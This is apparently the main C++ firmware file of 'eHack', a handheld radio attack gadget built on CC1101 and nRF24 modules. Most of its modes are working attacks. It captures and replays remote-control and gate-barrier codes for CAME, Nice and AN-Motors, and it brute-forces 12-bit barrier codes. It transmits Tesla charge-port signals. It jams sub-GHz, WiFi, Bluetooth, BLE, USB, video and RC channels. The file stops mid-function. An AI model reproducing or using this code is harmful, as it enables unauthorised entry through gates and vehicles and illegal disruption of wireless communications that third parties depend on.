#include "functions.h"

void setup()
{
  Serial.begin(9600);

  pinMode(FM_RESETPIN, OUTPUT);
  pinMode(FM_ENABLE_PIN, OUTPUT);
  pinMode(DISABLE_DEVICE_PIN, OUTPUT);
  digitalWrite(FM_RESETPIN, LOW);
  digitalWrite(FM_ENABLE_PIN, LOW);
  digitalWrite(DISABLE_DEVICE_PIN, LOW);

  // #ifdef DEBUG_eHack
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  // #endif

  Wire.setSDA(0);
  Wire.setSCL(1);
  Wire.begin();

  Wire1.setSDA(18);
  Wire1.setSCL(19);
  Wire1.begin();

  SPI.setSCK(2);
  SPI.setTX(3);
  SPI.setRX(4);
  SPI.begin();

  cc1101Init();

  SPI1.setSCK(10);
  SPI1.setTX(11);
  SPI1.setRX(12);
  SPI1.begin();

  radio_RF24.begin(&SPI1);

  analogReadResolution(12);
  batVoltage = readBatteryVoltage();

  oled.init();
  oled.setCursorXY((OLED_WIDTH - getTextWidth(APP_NAME)) / 2, 6);
  oled.print(APP_NAME);

  oled.setCursorXY((OLED_WIDTH - getTextWidth(APP_VERSION)) / 2, 18);
  oled.print(APP_VERSION);
  oled.update();

  delay(1000);

  communication.setSlaveMode();
  communication.init();

  currentLedMode = LED_ON;

  EEPROM.begin(MAX_EEPROM_VALUES);
  // clearMemory();
  findLastUsedSlotRA();
  findReceivedSignalsRA();
}

void setup1()
{
}

// Loop for common tasks
void loop1()
{
  handleSerialCommand();

  if (successfullyConnected || manualReplay)
  {
    switch (currentMode)
    {
    case IDLE:
    {
      if (!initializedIdle)
      {
        mySwitch.disableReceive();
        mySwitch.disableTransmit();
        mySwitch.resetAvailable();
        detachInterrupt(GD0_PIN_CC);
        digitalWrite(GD0_PIN_CC, LOW);
        digitalWrite(FM_ENABLE_PIN, LOW);
        digitalWrite(FM_RESETPIN, LOW);
        currentLedMode = LED_BLINK_SLOW;
        initialized = false;
        attackIsActive = false;
        initializedIdle = true;
      }
      break;
    }
    case HF_SPECTRUM:
    {
      static uint8_t sendFailCount = 0;
      static uint32_t lastStepMs = millis();
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;
      static bool waitingForSettle = false;

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        ELECHOUSE_cc1101.SetRx(raFrequencies[currentScanFreq]);
        radio_RF24.stopListening();
        currentLedMode = LED_BLINK_FAST;
        waitingForSettle = true;
        currentScanFreq = 0;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < SEND_DURATION_MS)
        {
          if (waitingForSettle)
          {
            if (millis() - lastStepMs >= RSSI_STEP_MS)
            {
              currentRssi = ELECHOUSE_cc1101.getRssi();

              int data[2];
              data[0] = currentRssi;
              data[1] = currentScanFreq;

              DBG("RSSI: %d, FREQ: %d\n", currentRssi, currentScanFreq);

              bool success = radio_RF24.write(&data, sizeof(data));

              currentScanFreq = (currentScanFreq + 1) % raFreqCount;
              ELECHOUSE_cc1101.SetRx(raFrequencies[currentScanFreq]);
              lastStepMs = millis();
              waitingForSettle = true;

              if (!success)
              {
                sendFailCount++;
                if (sendFailCount >= 5)
                {
                  radio_RF24.startListening();
                  currentMode = IDLE;
                  initialized = false;
                  sendFailCount = 0;
                  DBG("Failed to send data, switching to IDLE mode.\n");
                  return;
                }
              }
              else
              {
                sendFailCount = 0;
              }
            }
          }
        }
        else
        {
          radio_RF24.startListening();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          radio_RF24.stopListening();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case HF_ACTIVITY:
    {
      static uint8_t sendFailCount = 0;
      static uint32_t lastStepMs = millis();
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        mySwitch.enableReceive(GD0_PIN_CC);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        radio_RF24.stopListening();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < SEND_DURATION_MS)
        {
          if (millis() - lastStepMs >= RSSI_STEP_MS)
          {
            currentRssi = ELECHOUSE_cc1101.getRssi();
            DBG("RSSI: %d, FREQ: %.2f\n", currentRssi, radioFrequency);
            bool success = radio_RF24.write(&currentRssi, sizeof(currentRssi));
            lastStepMs = millis();
            if (!success)
            {
              sendFailCount++;
              if (sendFailCount >= 5)
              {
                radio_RF24.startListening();
                currentMode = IDLE;
                initialized = false;
                sendFailCount = 0;
                DBG("Failed to send data, switching to IDLE mode.\n");
                return;
              }
            }
            else
            {
              sendFailCount = 0;
            }
          }
        }
        else
        {
          radio_RF24.startListening();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          DBG("Received frequency: %.2f MHz\n", radioFrequency);
          initialized = false;
          return;
        }

        if (mySwitch.available())
        {
          if (mySwitch.getReceivedBitlength() < 10)
          {
            mySwitch.resetAvailable();
            break;
          }

          receivedCode = mySwitch.getReceivedValue();

          mySwitch.disableReceive();
          mySwitch.enableTransmit(GD0_PIN_CC);
          pinMode(GD0_PIN_CC, OUTPUT);
          ELECHOUSE_cc1101.SetTx(radioFrequency);

          mySwitch.setProtocol(mySwitch.getReceivedProtocol());
          mySwitch.setRepeatTransmit(10);
          mySwitch.setPulseLength(mySwitch.getReceivedDelay());
          mySwitch.send(receivedCode, mySwitch.getReceivedBitlength());
          DBG("Successfully sent!\n");
          DBG("Code: %d, Protocol: %d\n", receivedCode, mySwitch.getReceivedProtocol());

          mySwitch.resetAvailable();
          initialized = false;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          radio_RF24.stopListening();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case HF_REPLAY:
    {
      static uint32_t attackTimer = millis();

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        mySwitch.enableReceive(GD0_PIN_CC);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (manualReplay)
      {
        mySwitch.disableReceive();
        mySwitch.enableTransmit(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);

        mySwitch.setProtocol(manualProtocol);
        mySwitch.setRepeatTransmit(10);
        mySwitch.setPulseLength(manualDelay);

        mySwitch.send(manualCode, manualBitLength);

        initialized = false;
        manualReplay = false;

        break;
      }

      if (!attackIsActive && mySwitch.available())
      {
        // Check if the signal is valid
        if (mySwitch.getReceivedBitlength() < 10)
        {
          mySwitch.resetAvailable();
          break;
        }

        // Reapiting the signal
        mySwitch.disableReceive();
        mySwitch.enableTransmit(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);

        mySwitch.setProtocol(mySwitch.getReceivedProtocol());
        mySwitch.setRepeatTransmit(10);
        mySwitch.setPulseLength(mySwitch.getReceivedDelay());
        attackIsActive = true;

        receivedCode = mySwitch.getReceivedValue();
      }

      if (attackIsActive && millis() - attackTimer >= 1000)
      {
        mySwitch.send(receivedCode, mySwitch.getReceivedBitlength());
        attackTimer = millis();
        DBG("Successfully sent!\n");
        DBG("Code: %d, Protocol: %d\n", receivedCode, mySwitch.getReceivedProtocol());
      }

      break;
    }
    case HF_BARRIER_SCAN:
    {
      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (barrierCaptured)
      {
        // Repeating the signal
        detachInterrupt(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);

        if (barrierProtocol == 0)
        {
          sendANMotors(barrierCodeMain, barrierCodeAdd);
        }
        else if (barrierProtocol == 1)
        {
          sendNice(barrierCodeMain);
        }
        else if (barrierProtocol == 2)
        {
          sendCame(barrierCodeMain);
        }

        DBG("Successfully sent!\n");
        DBG("Code: %d, Protocol: %d\n", barrierCodeMain, barrierProtocol);

        barrierCaptured = false;
        initialized = false;
      }

      break;
    }
    case HF_BARRIER_REPLAY:
    {
      static uint32_t attackTimer = millis();

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, INPUT);
        ELECHOUSE_cc1101.SetRx(radioFrequency);
        attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (barrierCaptured)
      {
        barrierCaptured = false;

        // Repeating the signal
        detachInterrupt(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);

        attackIsActive = true;
      }

      if (attackIsActive && millis() - attackTimer >= 1000)
      {
        if (barrierProtocol == 0)
        {
          sendANMotors(barrierCodeMain, barrierCodeAdd);
        }
        else if (barrierProtocol == 1)
        {
          sendNice(barrierCodeMain);
        }
        else if (barrierProtocol == 2)
        {
          sendCame(barrierCodeMain);
        }

        DBG("Successfully sent!\n");
        DBG("Code: %d, Protocol: %d\n", barrierCodeMain, barrierProtocol);

        attackTimer = millis();
      }

      break;
    }
    case HF_BARRIER_BRUTE_CAME:
    {
      static uint32_t lastSendTime = millis();

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        barrierBruteIndex = 4095;
        initialized = true;
      }

      if (millis() - lastSendTime > 50)
      {
        lastSendTime = millis();

        if (barrierBruteIndex >= 0)
        {
          sendCame(barrierBruteIndex);
          DBG("CAME BRUTE: Code: %d\n", barrierBruteIndex);
          barrierBruteIndex--;
        }
        if (barrierBruteIndex < 0)
        {
          barrierBruteIndex = 4095;
          currentMode = IDLE;
        }
      }

      break;
    }
    case HF_BARRIER_BRUTE_NICE:
    {
      static uint32_t lastSendTime = millis();

      if (!initialized)
      {
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        barrierBruteIndex = 4095;
        initialized = true;
      }

      if (millis() - lastSendTime > 50)
      {
        lastSendTime = millis();

        if (barrierBruteIndex >= 0)
        {
          sendNice(barrierBruteIndex);
          DBG("CAME NICE: Code: %d\n", barrierBruteIndex);
          barrierBruteIndex--;
        }
        if (barrierBruteIndex < 0)
        {
          barrierBruteIndex = 4095;
          currentMode = IDLE;
        }
      }

      break;
    }
    case HF_JAMMER:
    {
      if (!initialized)
      {
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      static uint32_t lastNoise = 0;
      static bool noiseState = false;
      uint32_t nowMicros = micros();

      if (nowMicros - lastNoise > 500)
      {
        noiseState = !noiseState;
        digitalWrite(GD0_PIN_CC, noiseState);
        lastNoise = nowMicros;
      }

      break;
    }
    case HF_TESLA:
    {
      if (!initialized)
      {
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      static bool toggleFreq = false;
      float freq = toggleFreq ? 315.0 : 433.92;
      ELECHOUSE_cc1101.SetTx(freq);
      toggleFreq = !toggleFreq;

      DBG("Tesla Freq: %.2f\n", freq);

      sendTeslaSignal_v1();
      delay(50);
      sendTeslaSignal_v2();
      delay(50);

      break;
    }

    // Handle UHF modes
    case UHF_ALL_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF All Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(full_channels) / sizeof(full_channels[0]));
          radioChannel = full_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_WIFI_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF WiFi Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(wifi_channels) / sizeof(wifi_channels[0]));
          radioChannel = wifi_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_BT_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF Bluetooth Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
          radioChannel = bluetooth_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_BLE_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF BLE Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
          radioChannel = ble_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_USB_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF USB Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(usb_channels) / sizeof(usb_channels[0]));
          radioChannel = usb_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_VIDEO_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF VIDEO Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(video_channels) / sizeof(video_channels[0]));
          radioChannel = video_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }
    case UHF_RC_JAMMER:
    {
      static uint32_t lastSwitchTime = 0;
      static bool isSending = true;

      if (!initialized)
      {
        DBG("Initializing UHF RC Jammer mode...\n");
        initRadioAttack();
        currentLedMode = LED_BLINK_FAST;
        initialized = true;
      }

      if (isSending)
      {
        if (millis() - lastSwitchTime < 5 * SEND_DURATION_MS)
        {
          int randomIndex = random(0, sizeof(rc_channels) / sizeof(rc_channels[0]));
          radioChannel = rc_channels[randomIndex];
          radio_RF24.setChannel(radioChannel);
        }
        else
        {
          stopRadioAttack();
          communication.setSlaveMode();
          communication.init();
          isSending = false;
          lastSwitchTime = millis();
        }
      }
      else
      {
        if (communication.receivePacket(recievedData, &recievedDataLen) && recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          return;
        }

        if (millis() - lastSwitchTime >= LISTEN_DURATION_MS)
        {
          initRadioAttack();
          isSending = true;
          lastSwitchTime = millis();
        }
      }

      break;
    }

    case FM_RADIO:
    {
      if (!initialized)
      {
        digitalWrite(FM_ENABLE_PIN, HIGH);
        digitalWrite(FM_RESETPIN, HIGH);

        radio_fm.begin();

        delay(1000);
        radio_fm.setTXpower(115);
        radio_fm.tuneFM(FrequencyFM);

        radio_fm.readTuneStatus();
        DBG("FM: Current frequency: %.2f MHz\n", radio_fm.currFreq / 100.0);
        DBG("FM: Current dBuV: %d\n", radio_fm.currdBuV);
        DBG("FM: Current Antenna Cap: %d\n", radio_fm.currAntCap);

        radio_fm.beginRDS();
        radio_fm.setRDSstation(RDS_STATION);
        radio_fm.setRDSbuffer(RDS_BUFFER);

        initialized = true;
      }

      break;
    }
    }
  }

  if (currentMode == HF_SCAN)
  {
    if (!initialized)
    {
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.enableReceive(GD0_PIN_CC);
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      currentLedMode = LED_BLINK_FAST;
      initialized = true;
    }

    if (successfullyConnected && receivedSignals > 0)
    {
      mySwitch.disableReceive();
      mySwitch.enableTransmit(GD0_PIN_CC);
      pinMode(GD0_PIN_CC, OUTPUT);
      ELECHOUSE_cc1101.SetTx(radioFrequency);
      mySwitch.setRepeatTransmit(10);
      delay(1000);

      for (uint8_t i = 0; i < receivedSignals; i++)
      {
        DBG("Sending %d code...!\n", i);
        SimpleRAData data = readRAData(i);
        mySwitch.setProtocol(data.protocol);
        mySwitch.setPulseLength(data.delay);
        mySwitch.send(data.code, data.length);
        clearRAData(i);
        delay(1000);
      }

      receivedSignals = 0;
      initialized = false;
      DBG("Successfully sent all saved data!\n");
      return;
    }

    if (mySwitch.available())
    {
      // Check if the signal is valid
      if (mySwitch.getReceivedBitlength() < 10)
      {
        mySwitch.resetAvailable();
        return;
      }

      receivedCode = mySwitch.getReceivedValue();
      uint16_t newLength = mySwitch.getReceivedBitlength();
      uint16_t newProtocol = mySwitch.getReceivedProtocol();
      uint16_t newDelay = mySwitch.getReceivedDelay();

      DBG("Code: %d, Protocol: %d\n", receivedCode, newProtocol);

      // Reapiting the signal
      if (successfullyConnected)
      {
        mySwitch.disableReceive();
        mySwitch.enableTransmit(GD0_PIN_CC);
        pinMode(GD0_PIN_CC, OUTPUT);
        ELECHOUSE_cc1101.SetTx(radioFrequency);

        mySwitch.setProtocol(newProtocol);
        mySwitch.setRepeatTransmit(10);
        mySwitch.setPulseLength(newDelay);
        mySwitch.send(receivedCode, newLength);
        DBG("Successfully sent!\n");
      }
      // Store in memory
      else
      {
        SimpleRAData data;
        data.code = receivedCode;
        data.length = newLength;
        data.protocol = newProtocol;
        data.delay = newDelay;

        if (!isDuplicateRA(data))
        {
          writeRAData(lastUsedSlotRA, data);
          lastUsedSlotRA = (lastUsedSlotRA + 1) % MAX_RA_SIGNALS;
          if (receivedSignals < MAX_RA_SIGNALS)
            receivedSignals++;
          DBG("Stored in memory (code=%lu)\n", (unsigned long)receivedCode);
        }
      }

      mySwitch.resetAvailable();
      initialized = false;
    }
  }
}

// Loop for communication tasks
void loop()
{
  uint32_t onTime = 0;
  uint32_t offTime = 0;

  switch (currentLedMode)
  {
  case LED_ON:
    digitalWrite(LED_BUILTIN, HIGH);
    break;
  case LED_OFF:
    digitalWrite(LED_BUILTIN, LOW);
    break;
  case LED_BLINK_SLOW:
    onTime = 500;
    offTime = 500;
    break;
  case LED_BLINK_FAST:
    onTime = 50;
    offTime = 500;
    break;
  }

  if (onTime > 0 || offTime > 0)
  {
    if ((ledState && millis() - ledTimer >= onTime) || (!ledState && millis() - ledTimer >= offTime))
    {
      ledState = !ledState;
      digitalWrite(LED_BUILTIN, ledState);
      ledTimer = millis();
    }
  }

  if (!successfullyConnected)
  {
    currentLedMode = LED_ON;

    if (millis() - offTimer > DISABLE_DEVICE_DELAY && currentMode != HF_SCAN && !Serial.available())
    {
      DBG("Going to sleep...: %d\n", currentMode);
      digitalWrite(DISABLE_DEVICE_PIN, HIGH);
      delay(1000);
    }

    if (communication.receivePacket(recievedData, &recievedDataLen))
    {
      if (recievedData[0] == 'P' && recievedData[1] == 'I' && recievedData[2] == 'N' && recievedData[3] == 'G')
      {
        DBG("Slave: PING received. Sending PONG...\n");
        if (communication.sendPacket(pong, sizeof(pong)))
        {
          DBG("Slave: PONG sent successfully.\n");
          DBG("Connection established\n");
          checkConnectionTimer = millis();
          successfullyConnected = true;
          currentMode = IDLE;
          currentLedMode = LED_BLINK_SLOW;
          batteryTimer = millis() - BATTERY_CHECK_INTERVAL;
        }
        else
        {
          DBG("Slave: FAILED to send PONG\n");
        }
      }
    }
  }
  else if (successfullyConnected)
  {
    switch (currentMode)
    {
    case UHF_SPECTRUM:
    case UHF_ALL_JAMMER:
    case UHF_WIFI_JAMMER:
    case UHF_BT_JAMMER:
    case UHF_BLE_JAMMER:
    case UHF_USB_JAMMER:
    case UHF_VIDEO_JAMMER:
    case UHF_RC_JAMMER:
    case HF_ACTIVITY:
    case HF_SPECTRUM:
      break;

    default:
    {
      if (millis() - checkConnectionTimer > CONNECTION_DELAY)
      {
        DBG("Slave: Connection LOST (Master timeout)!\n");
        successfullyConnected = false;
        offTimer = millis();
        return;
      }

      if (communication.receivePacket(recievedData, &recievedDataLen))
      {
        if (recievedData[0] == PROTOCOL_HEADER)
        {
          checkConnectionTimer = millis();
          currentMode = getModeFromPacket(recievedData, recievedDataLen);
          if (currentMode == FM_RADIO)
          {
            FrequencyFM = getFMFrequencyFromPacket(recievedData, recievedDataLen);
            radio_fm.tuneFM(FrequencyFM);
            DBG("Received frequency: %lu MHz\n", FrequencyFM);
          }
          else
          {
            radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
            DBG("Received frequency: %.2f MHz\n", radioFrequency);
          }
          DBG("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
          initializedIdle = false;

          switch (currentMode)
          {
          case UHF_SPECTRUM:
          case UHF_ALL_JAMMER:
          case UHF_WIFI_JAMMER:
          case UHF_BT_JAMMER:
          case UHF_BLE_JAMMER:
          case UHF_USB_JAMMER:
          case UHF_VIDEO_JAMMER:
          case UHF_RC_JAMMER:
            DBG("Returned\n");
            return;
          }

          if (initialized)
          {
            switch (currentMode)
            {
            case HF_SCAN:
            case HF_BARRIER_SCAN:
              ELECHOUSE_cc1101.SetRx(radioFrequency);
              DBG("Setted RX Freq\n");
              break;
            case HF_REPLAY:
            case HF_JAMMER:
            case HF_BARRIER_REPLAY:
            case HF_BARRIER_BRUTE_NICE:
            case HF_BARRIER_BRUTE_CAME:
              ELECHOUSE_cc1101.SetTx(radioFrequency);
              DBG("Setted TX Freq\n");
              break;
            }
          }
        }
        else if (recievedData[0] == 'P' && recievedData[1] == 'I' && recievedData[2] == 'N' && recievedData[3] == 'G')
        {
          DBG("Master: PING received!\n");
          checkConnectionTimer = millis();
          if (communication.sendPacket(pong, sizeof(pong)))
          {
            DBG("Master: PONG sent! Connection OK.\n");
          }
        }
        else if (recievedData[0] == 'O' && recievedData[1] == 'F' && recievedData[2] == 'F')
        {
          DBG("Master: OFF received!\n");
          DBG("Going to sleep...\n");
          digitalWrite(DISABLE_DEVICE_PIN, HIGH);
          delay(1000);
        }
      }

      // Send to eHack
      if (millis() - batteryTimer > BATTERY_CHECK_INTERVAL)
      {
        batVoltage = readBatteryVoltage();
        DBG("Battery voltage: %.2fV\n", batVoltage);
        uint8_t batteryVoltagePacketLen = communication.buildPacket(COMMAND_BATTERY_VOLTAGE, (uint8_t *)&batVoltage, sizeof(batVoltage), batteryVoltagePacket);
        communication.sendPacket(batteryVoltagePacket, batteryVoltagePacketLen);
        batteryTimer = millis();
      }
      if (currentMode == FM_RADIO && millis() - asqTimer > 200)
      {
        radio_fm.readASQ();
        int8_t inLevel = radio_fm.currInLevel;
        DBG("FM: Current sound level: %d\n", inLevel);
        uint8_t pktLen = communication.buildPacket(COMMAND_FM_RADIO, (uint8_t *)&inLevel, sizeof(inLevel), currentLevelPacket);
        communication.sendPacket(currentLevelPacket, pktLen);
        asqTimer = millis();
      }

      break;
    }
    }
  }

  if (millis() - displayTimer >= OLED_UPDATE)
  {
    oled.clear();

    drawCharRot90L(5, 0, 'W');
    drawCharRot90L(23, 0, 'C');
    oled.fastLineV(9, 0, 32);

    char Text[20];
    snprintf(Text, sizeof(Text), "E:%d", receivedSignals);
    oled.setCursorXY(115 - getTextWidth(Text) - 2, 0);
    oled.print(Text);

    if (successfullyConnected)
    {
      drawRadioConnected();

      char Text[20];
      snprintf(Text, sizeof(Text), "%s", getModeLabel(currentMode));
      oled.setCursorXY(12, 0);
      oled.print(Text);

      if (currentMode == FM_RADIO)
      {
        char FmText[20];
        snprintf(FmText, sizeof(FmText), "%.2f MHz", FrequencyFM / 100.0f);
        oled.setCursorXY((128 - getTextWidth(FmText)) / 2, 16);
        oled.print(FmText);
      }
      else if (isUHFMode(currentMode))
      {
        char ChannelText[12];
        snprintf(ChannelText, sizeof(ChannelText), "CH:%u", radioChannel);
        oled.setCursorXY((128 - getTextWidth(ChannelText)) / 2, 16);
        oled.print(ChannelText);
      }
      else if (isHFCodeMode(currentMode))
      {
        char CodeText[20];
        snprintf(CodeText, sizeof(CodeText), "C:%lu", (unsigned long)receivedCode);
        oled.setCursorXY((128 - getTextWidth(CodeText)) / 2, 16);
        oled.print(CodeText);
      }
    }
    else
    {
      char Text[20];
      snprintf(Text, sizeof(Text), "Connecting...");
      oled.setCursorXY((128 - getTextWidth(Text)) / 2, 16);
      oled.print(Text);
    }

    oled.update();
    displayTimer = millis();
  }

#ifdef DEBUG_eHack
  static uint32_t timer;
  if (millis() - timer > 1000)
